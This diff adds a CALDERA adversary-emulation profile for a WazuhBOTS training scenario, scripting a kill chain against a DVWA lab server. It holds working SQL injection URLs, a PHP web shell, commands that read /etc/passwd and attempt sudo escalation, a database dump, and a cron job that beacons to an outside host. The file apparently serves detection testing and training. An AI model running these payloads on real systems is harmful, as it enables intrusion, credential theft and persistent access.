@@ -1,0 +1,101 @@
+# ============================================
+# WazuhBOTS — CALDERA Adversary Profile
+# Scenario 1: Operation Dark Harvest
+# Web Application Compromise Kill Chain
+# ============================================
+
+id: wazuhbots-dark-harvest
+name: "Operation Dark Harvest"
+description: |
+  Simulates an external attacker compromising a vulnerable web application.
+  Kill chain: Recon → SQLi → Web Shell → Privilege Escalation → Data Exfil → Persistence
+
+atomic_ordering:
+  # Phase 1: Reconnaissance
+  - technique: T1595.002
+    name: "Active Scanning: Vulnerability Scanning"
+    description: "Nmap and Nikto scans against web-srv"
+    commands:
+      - "nmap -sV -sC -p 80,443,3306 web-srv -oN /tmp/nmap_websrv.txt"
+      - "nikto -h http://web-srv/dvwa -output /tmp/nikto_websrv.txt"
+    delay_seconds: 30
+
+  # Phase 2: Initial Access - SQL Injection
+  - technique: T1190
+    name: "Exploit Public-Facing Application"
+    description: "SQL Injection against DVWA"
+    commands:
+      - "curl 'http://web-srv/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit' -b 'PHPSESSID=attack_session; security=low'"
+      - "curl 'http://web-srv/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+&Submit=Submit' -b 'PHPSESSID=attack_session; security=low'"
+    delay_seconds: 60
+
+  # Phase 3: Persistence - Web Shell Upload
+  - technique: T1505.003
+    name: "Server Software Component: Web Shell"
+    description: "Upload PHP web shell via DVWA file upload"
+    commands:
+      - "curl -F 'MAX_FILE_SIZE=100000' -F 'uploaded=@/tmp/payload/cmd.php;type=image/jpeg' 'http://web-srv/dvwa/vulnerabilities/upload/' -b 'PHPSESSID=attack_session; security=low'"
+    payload_files:
+      - name: "cmd.php"
+        content: "<?php if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);} ?>"
+    delay_seconds: 30
+
+  # Phase 4: Execution via Web Shell
+  - technique: T1059.004
+    name: "Command and Scripting Interpreter: Unix Shell"
+    description: "Execute commands via uploaded web shell"
+    commands:
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=id'"
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=whoami'"
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=uname+-a'"
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=cat+/etc/passwd'"
+    delay_seconds: 15
+
+  # Phase 5: Privilege Escalation
+  - technique: T1068
+    name: "Exploitation for Privilege Escalation"
+    description: "Attempt sudo-based privilege escalation"
+    commands:
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=sudo+-l'"
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=find+/+-perm+-4000+2>/dev/null'"
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=sudo+/bin/bash+-c+id'"
+    delay_seconds: 20
+
+  # Phase 6: Data Collection & Exfiltration
+  - technique: T1048
+    name: "Exfiltration Over Alternative Protocol"
+    description: "Dump database and exfiltrate"
+    commands:
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=mysqldump+-u+dvwa+-pp@ssw0rd+company_data+employees+>+/tmp/.data_dump.sql'"
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=cat+/tmp/.data_dump.sql'"
+    delay_seconds: 30
+
+  # Phase 7: Persistence via Cron
+  - technique: T1053.003
+    name: "Scheduled Task/Job: Cron"
+    description: "Establish persistence via cron job"
+    commands:
+      - "curl 'http://web-srv/dvwa/hackable/uploads/cmd.php?cmd=echo+\"*/5+*+*+*+*+curl+http://172.25.0.100:4444/beacon\"+|+crontab+-'"
+    delay_seconds: 10
+
+target_hosts:
+  - hostname: web-srv
+    ip: 172.25.0.30
+
+mitre_coverage:
+  tactics:
+    - Reconnaissance
+    - Initial Access
+    - Execution
+    - Persistence
+    - Privilege Escalation
+    - Collection
+    - Exfiltration
+  techniques:
+    - T1595.002
+    - T1190
+    - T1505.003
+    - T1059.004
+    - T1068
+    - T1048
+    - T1053.003
